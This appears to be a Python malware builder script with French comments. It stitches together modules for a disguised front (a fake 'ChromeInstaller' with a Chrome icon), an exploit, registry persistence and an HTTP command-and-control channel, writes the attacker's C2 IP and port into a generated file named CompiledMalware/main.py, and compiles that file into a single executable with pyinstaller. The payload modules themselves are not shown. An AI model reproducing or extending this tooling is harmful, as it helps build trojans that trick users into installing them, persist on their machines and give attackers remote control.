import os
import shutil
import argparse

# Listes des modules disponibles
list_modules_front = ["Chrome"]
list_modules_exploit = ["LetterOnDesktop"]
list_modules_persistance = ["Registry"]
list_modules_c2c = ["HTTP"]

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CompileCommand = 0

def ResetFolder(folder_path):
    print(f"Resetting Folder: {folder_path}")
    if os.path.exists(folder_path):
        shutil.rmtree(folder_path)

def CreateFolder(folder_path):
    if not os.path.exists(folder_path):
        print(f"Creating Folder: {folder_path}")
        os.makedirs(folder_path)

def CreateMainFile(file_path):
    with open(file_path, "w") as file:
        file.write("\n")
    print(f"Created file : {file_path}")

def SelectModuleFront(selectedModule, file_path, folder_path):
    foundModule = False
    if selectedModule in list_modules_front:
        foundModule = True
        global CompileCommand
        destination_path = os.path.join(folder_path, "Result")
        build_path = os.path.join(folder_path, "build") 
        spec_path = os.path.join(folder_path, "spec") 
        os.makedirs(spec_path, exist_ok=True)
        CompileCommand = f'pyinstaller --onefile --name="ChromeInstaller" --icon="{os.path.join(BASE_DIR, "ModuleFront\\Chrome\\chrome.ico")}" --distpath="{destination_path}" --workpath="{build_path}" --specpath="{spec_path}" "{os.path.join(BASE_DIR, "CompiledMalware\\main.py")}"'        
        file_content = ReadFile(os.path.join(BASE_DIR, "ModuleFront/Chrome/ChromeFrontModule.py"))
        if file_content:
            AppendToFile(file_path, file_content.split("\n"))
    if not foundModule:
        print("Module front not found. Exiting...")
        exit(1)

def SelectModuleExploit(selectedModule, file_path):
    foundModule = False
    if selectedModule in list_modules_exploit:
        foundModule = True
        if selectedModule in list_modules_exploit:
            file_content = ReadFile(os.path.join(BASE_DIR, f"ModuleExploit/{selectedModule}.py"))
        else:
            print("Selected exploit module is not supported. Exiting...")
            exit(1)
        if file_content:
            AppendToFile(file_path, file_content.split("\n"))
        else:
            print("Error when adding module to main file. Exiting...")
            exit(1)
    if not foundModule:
        print("Module exploit not found")
        exit(1)

def SelectModulePersistance(selectedModule, file_path):
    foundModule = False
    if selectedModule in list_modules_persistance:
        foundModule = True
        file_content = ReadFile(os.path.join(BASE_DIR, f"ModulePersistance/{selectedModule}.py"))
        if file_content:
            AppendToFile(file_path, file_content.split("\n"))
        else:
            print("Error when adding module to main file. Exiting...")
            exit(1)
    if not foundModule:
        print("Module persistance not found")
        exit(1)

def SelectModuleC2C(selectedModule, file_path, ip, port):
    foundModule = False
    if selectedModule in list_modules_c2c:
        foundModule = True
        file_content = ReadFile(os.path.join(BASE_DIR, f"ModuleC2C/{selectedModule}.py"))
        if file_content:
            AppendToFileWithouNewLine(file_path, "C2C_IP = \""+ip+"\"")
            AppendToFileWithouNewLine(file_path, "\n")
            AppendToFileWithouNewLine(file_path, "C2C_PORT = \""+port+"\"")
            AppendToFileWithouNewLine(file_path, "\n")
            AppendToFile(file_path, file_content.split("\n"))
        else:
            print("Error when adding module to main file. Exiting...")
            exit(1)
    if not foundModule:
        print("Module C2C not found")
        exit(1)

def ReadFile(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read() 
    except FileNotFoundError:
        print(f"Erreur : Le fichier '{file_path}' n'existe pas.")
        return None
    except Exception as e:
        print(f"Une erreur est survenue : {e}")
        return None

def AppendToFile(file_path, new_lines):
    with open(file_path, "a") as file:
        for line in new_lines:
            file.write(line + "\n")
    print(f"Lignes ajoutées au fichier : {file_path}")

def AppendToFileWithouNewLine(file_path, new_lines):
    with open(file_path, "a") as file:
        for line in new_lines:
            file.write(line)
    print(f"Lignes ajoutées au fichier : {file_path}")

def RunCompileCommand(CompileCommand):
    os.system(CompileCommand)
    print(f"Commande de compilation exécutée : {CompileCommand}")

def main():
    # Utiliser argparse pour récupérer les paramètres d'entrée
    parser = argparse.ArgumentParser(
        description="Compilation script for modules",
        formatter_class=argparse.RawTextHelpFormatter  # Permet l'affichage de texte formaté
    )

    # Ajout des arguments
    parser.add_argument(
        "--ModuleFront",
        required=True,
        help=f"Nom du module front à utiliser. Modules disponibles : {', '.join(list_modules_front)}"
    )
    parser.add_argument(
        "--ModuleExploit",
        required=True,
        help=f"Nom du module exploit à utiliser. Modules disponibles : {', '.join(list_modules_exploit)}"
    )
    parser.add_argument(
        "--ModulePersistance",
        required=True,
        help=f"Nom du module persistance à utiliser. Modules disponibles : {', '.join(list_modules_persistance)}"
    )
    parser.add_argument(
        "--ModuleC2C",
        required=True,
        help=f"Nom du module C2C à utiliser. Modules disponibles : {', '.join(list_modules_c2c)}"
    )

    parser.add_argument(
        "--ModuleC2C_IP",
        required=True,
        help=f"Nom du module C2C à utiliser. Modules disponibles : {', '.join(list_modules_c2c)}"
    )

    parser.add_argument(
        "--ModuleC2C_PORT",
        required=True,
        help=f"Nom du module C2C à utiliser. Modules disponibles : {', '.join(list_modules_c2c)}"
    )
    
    try:
        args = parser.parse_args()
    except SystemExit:
        print("\n--- Liste des modules disponibles ---")
        print(f"Modules Front disponibles : {', '.join(list_modules_front)}")
        print(f"Modules Exploit disponibles : {', '.join(list_modules_exploit)}")
        print(f"Modules Persistance disponibles : {', '.join(list_modules_persistance)}")
        print(f"Modules C2C disponibles : {', '.join(list_modules_c2c)}\n")
        exit(1)

    folder_path = os.path.join(BASE_DIR, "CompiledMalware")
    file_path = os.path.join(folder_path, "main.py")
    
    # 1 - Reset folder
    ResetFolder(folder_path)
    # 2 - Create folder
    CreateFolder(folder_path)
    # 3 - Create main file
    CreateMainFile(file_path)
    # 4 - Select module C2C
    SelectModuleC2C(args.ModuleC2C, file_path, args.ModuleC2C_IP, args.ModuleC2C_PORT)
    # 4 - Select module persistance
    SelectModulePersistance(args.ModulePersistance, file_path)
    # 4 - Select module exploit
    SelectModuleExploit(args.ModuleExploit, file_path)
    # 5 - Select module front (Always put the front module at the end)
    SelectModuleFront(args.ModuleFront, file_path, folder_path)
    # 6 - Run compile command
    if CompileCommand != 0:
        print(f"Starting compilation...")
        RunCompileCommand(CompileCommand)
    else:
        print("Commande de compilation non définie. Exiting")

if __name__ == "__main__":
    main()